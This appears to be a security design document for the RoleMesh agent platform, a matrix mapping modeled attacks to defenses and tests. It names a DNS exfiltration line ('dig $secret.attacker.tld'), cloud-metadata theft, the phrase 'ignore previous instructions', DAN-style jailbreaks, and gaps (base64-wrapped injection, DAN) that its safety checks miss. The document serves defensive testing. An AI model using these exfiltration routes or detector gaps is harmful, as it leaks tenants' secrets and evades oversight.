# Attack Simulation Matrix

Tracks every modeled attack against RoleMesh's three defense layers (container hardening, content safety pipeline, network egress) plus the tenant-isolation surface, with the current status of each defense.

This document is a **snapshot** keyed to the test suite. The authoritative status lives in `tests/attack_sim/` and `scripts/verify-hardening.sh`; if a status here disagrees with the test outcomes, the tests win. The matrix is meant for orientation — "what attacks have we modeled, what category does this gap fall in, which doc to read for the defense design."

**Source of truth**: `tests/attack_sim/` (automated) and `scripts/verify-hardening.sh` (manual, live container).

For the design rationale behind each defense layer, see:

- [`13-safety-overview.md`](13-safety-overview.md) — the three-layer model
- [`14-container-hardening-architecture.md`](14-container-hardening-architecture.md) — A and G categories
- [`15-safety-framework-architecture.md`](15-safety-framework-architecture.md) — B4, C, D categories (content checks)
- [`16-egress-control-architecture.md`](16-egress-control-architecture.md) — D4 and parts of B (network exfil)
- [`6-auth-architecture.md`](6-auth-architecture.md), [`4-multi-tenant-architecture.md`](4-multi-tenant-architecture.md) — E category

---

## Status legend

- ✅ **defended** — automated test asserts the defense holds
- ❌ **undefended (known)** — xfail test documents the gap, closes when the named defense ships
- 🔧 **manual only** — verified by runbook, not automated
- 📝 **documented limitation** — we looked, chose not to defend in v1; see linked note

---

## A. Container escape / sandbox breakout

Backed by [`14-container-hardening-architecture.md`](14-container-hardening-architecture.md).

| ID | Attack | Defense | Test | Status |
|---|---|---|---|---|
| A1 | Fork bomb | PidsLimit 512 | `test_A_container_escape_spec::test_A1_fork_bomb_capped_by_pids_limit` | ✅ spec + 🔧 manual |
| A2 | ptrace another process | seccomp default + CapDrop ALL + no-new-privileges | `test_A2_ptrace_requires_cap_blocked_by_cap_drop` | ✅ spec + 🔧 manual |
| A3 | Mount /proc/kcore | CapDrop ALL (no CAP_SYS_ADMIN) + AppArmor | `test_A3_kcore_mount_requires_sys_admin_which_is_dropped` | ✅ spec + 🔧 manual |
| A4 | Write /etc/shadow, persist rootfs | ReadonlyRootfs + tmpfs carve-outs | `test_A4_rootfs_is_readonly` | ✅ spec + 🔧 manual |
| A5 | Cloud metadata credential theft | ExtraHosts blackhole (`169.254.169.254`, `metadata.google.internal` → `127.0.0.1`) | `test_A5_metadata_endpoints_blackholed` | ✅ spec + 🔧 manual |
| A6 | docker.sock mount injection | `_is_docker_socket_path` basename guard | `test_A6_docker_sock_mount_injection_detected`, `test_A6_spec_to_config_rejects_docker_sock_mount` | ✅ |
| A7 | Privileged container request | `HostConfig` never emits `Privileged` | `test_A7_privileged_never_true` | ✅ |
| A8 | Swap-based memory amplification | `MemorySwap == Memory`; `Swappiness 0` | `test_A8_swap_disabled_equal_to_memory` | ✅ spec + 🔧 manual |

---

## B. Credential / secret theft

Backed by [`6-auth-architecture.md`](6-auth-architecture.md) (TokenVault), [`7-external-mcp-architecture.md`](7-external-mcp-architecture.md) (credential proxy), [`15-safety-framework-architecture.md`](15-safety-framework-architecture.md) (secret scanner).

| ID | Attack | Defense | Test | Status |
|---|---|---|---|---|
| B1 | Rogue backend smuggles secret via `extra_env` | `CONTAINER_ENV_ALLOWLIST` + `_filter_env_allowlist` | `test_B_secret_exfil::test_B1_*` | ✅ |
| B2 | Probe credential proxy to enumerate providers | No rate limit currently | `test_B2_*` | ❌ xfail (rate-limit gap) |
| B3 | Read `/proc/<pid>/environ` of sibling | CapDrop + seccomp + PID namespace | `test_B3_cross_process_env_read_blocked_by_spec` + runbook | ✅ spec + 🔧 manual |
| B4 | Secret pattern in LLM output / tool result | `secret_scanner` check (detect-secrets) | `test_B4_secret_scanner_catches_patterns` (7 patterns) | ✅ (safety-ml) |
| B4' | Obfuscated secret (split across tokens) | detect-secrets is pattern-based | `test_B4_secret_scanner_obfuscation_limits_documented` | 📝 documented gap |

---

## C. Prompt injection / jailbreak

Backed by [`15-safety-framework-architecture.md`](15-safety-framework-architecture.md) (ML-backed checks).

| ID | Attack | Defense | Test | Status |
|---|---|---|---|---|
| C1 | Classic "ignore previous instructions" | `llm_guard.prompt_injection` | `test_C_prompt_injection::test_C1_*` (3 variants) | ✅ (safety-ml) |
| C2 | DAN / grandma / role-override jailbreak | `llm_guard.jailbreak` | `test_C2_jailbreak_templates_current_behavior` (2 variants) | 📝 current detector misses DAN-family — print-only for now |
| C3 | Benign inputs (false-positive control) | n/a | `test_C3_benign_inputs_pass` | ✅ (safety-ml) |
| C4 | Base64-wrapped injection | Pattern detector alone misses | `test_C4_base64_wrapped_injection_known_gap` | 📝 documented gap |

---

## D. Data exfiltration

Backed by [`15-safety-framework-architecture.md`](15-safety-framework-architecture.md) (`pii.regex`, `domain_allowlist`) and [`16-egress-control-architecture.md`](16-egress-control-architecture.md) (DNS resolver, forward proxy).

| ID | Attack | Defense | Test | Status |
|---|---|---|---|---|
| D1 | PII (SSN / CC) in LLM output | `pii.regex` check | `test_D_data_exfil::test_D1_*` | ✅ |
| D2 | Tool call to attacker URL (dict field) | `domain_allowlist` check | `test_D2_tool_call_to_attacker_url_blocked` | ✅ |
| D3 | URL hidden inside Bash command string | `domain_allowlist` walks string leaves | `test_D3_url_in_bash_command_string_detected` | ✅ |
| D4 | DNS exfil via `dig $secret.attacker.tld` | Authoritative DNS resolver + per-tenant allowlist (EC-2) | `test_D4_dns_exfiltration_prevented` | This row was historically ❌ xfail pending EC-2; EC-2 has since landed (see [`16-egress-control-architecture.md`](16-egress-control-architecture.md)) — check the test outcome for the current status |
| D5 | Pastebin / transfer.sh data drop | `domain_allowlist` (positive allowlist) | `test_D5_paste_services_blocked` (4 hosts) | ✅ |

---

## E. Tenant isolation

Backed by [`4-multi-tenant-architecture.md`](4-multi-tenant-architecture.md) (dual-pool RLS) and [`6-auth-architecture.md`](6-auth-architecture.md) (IPC trust boundary).

| ID | Attack | Defense | Test | Status |
|---|---|---|---|---|
| E1 | Forge tenantId in NATS payload | Engine `_tenant_matches` guard | `test_E_tenant_isolation::test_E1_*` | ✅ |
| E2 | Forge coworkerId belonging to another tenant | IPC dispatcher uses source coworker's authoritative tenant | `test_E2_forged_coworker_id_dropped` | ✅ |
| E6 | NATS subject sidechannel (A reads B's tasks) | NATS account-per-tenant (not implemented) | `test_E6_nats_subject_sidechannel_isolation` | ❌ xfail (NATS ACL gap) |

---

## G. Denial of service

Backed by [`14-container-hardening-architecture.md`](14-container-hardening-architecture.md) (resource ceilings) and [`15-safety-framework-architecture.md`](15-safety-framework-architecture.md) (pipeline cost).

| ID | Attack | Defense | Test | Status |
|---|---|---|---|---|
| G1 | Fork bomb inside container | PidsLimit 512 | runbook only | 🔧 manual |
| G2 | Infinite loop agent | `CONTAINER_TIMEOUT` 30 min kill | runbook only | 🔧 manual |
| G3 | Oversized `tool_input` payload | Pipeline check remains linear | `test_G_dos::test_G3_*` | ✅ |
| G5 | Registry lookup churn | Dict-based O(1) lookup | `test_G5_registry_lookup_is_constant_time` | ✅ |
| G6 | Audit write pressure | Single-insert per event | `test_G6_audit_write_pressure` | ✅ |

---

## H. Configuration attacks

Backed by [`6-auth-architecture.md`](6-auth-architecture.md) and [`15-safety-framework-architecture.md`](15-safety-framework-architecture.md).

| ID | Attack | Defense | Test | Status |
|---|---|---|---|---|
| H1 | Agent schedules task for another coworker | `can_manage_task` + `task_manage_others` flag | `test_H_config_attack::test_H1_*` | ✅ |
| H2 | Malformed / injected policy config via REST | Pydantic `config_model` + `extra='forbid'` | `test_H2_*` (6 cases, including `__class__` gadget) | ✅ |
| H3 | Agent reaches the host project root via a container mount | `build_volume_mounts` never mounts the host project root into any container, regardless of permissions | `test_H3_project_root_is_never_mounted` | ✅ |
| H4 | Symlink escape from workspace | PID / mount namespace + mount allowlist | runbook only | 🔧 manual |

---

## Summary counts (snapshot, 2026-04-22)

The counts below were taken at the time the matrix was first drafted. Run `pytest tests/attack_sim/ -v` for the live picture.

| Category | ✅ | ❌ xfail | 📝 docs-only | 🔧 manual-only |
|---|---|---|---|---|
| A. Container | 12 | 0 | 0 | 6 shared |
| B. Secrets | 10 | 1 | 1 | 1 |
| C. Prompt injection | 7 | 0 | 3 | 0 |
| D. Data exfil | 7 | 1 | 0 | 0 |
| E. Tenant iso | 2 | 1 | 0 | 0 |
| G. DoS | 3 | 0 | 0 | 2 |
| H. Config | 8 | 0 | 0 | 1 |
| **Total** | **49** | **3** | **4** | **10** |

---

## Known undefended attacks (the xfail list)

These will be "progress signals" when their defense layer lands:

1. **B2 credential-proxy enumeration** — close via rate-limit or per-agent auth on the credential proxy.
2. **D4 DNS exfiltration** — EC-2 has landed with an authoritative DNS resolver + per-tenant allowlist (see [`16-egress-control-architecture.md`](16-egress-control-architecture.md)); the xfail can be retired once the test is rewritten to exercise the gateway-side path.
3. **E6 NATS subject sidechannel** — close via NATS account-per-tenant or tenant-scoped NATS credentials.

## Documented limitations (we looked, chose not to defend in v1)

- **B4' split secrets** — detect-secrets is pattern + entropy; an LLM-as-scanner second layer could catch these. Not shipping in v1.
- **C2 DAN-family jailbreak** — llm-guard jailbreak detector misses these. Documented in test as print-only; will flip to ✅ when detector or custom check catches.
- **C4 base64-wrapped injection** — pattern detector misses; LLM-based scanner needed.
- **F6 Stop / proposal NATS race** — orphan pending row reaped by expiry within `auto_expire_minutes`. Cost of perfect reap (a `cancelled_jobs` tracking table) not justified in v1.
- **Manual runbook-only items** — require a live container; spec-level pin is in automated tests, runtime verification in `scripts/verify-hardening.sh`.

---

## Running

```bash
# Default (fast + ML-backed if [safety-ml] installed):
pytest tests/attack_sim/ -v

# Without [safety-ml] extras — C and B4 corpus skip:
pytest tests/attack_sim/ -v -k "not ml"

# Manual runbook (requires live container):
scripts/verify-hardening.sh <agent-container-name>
```
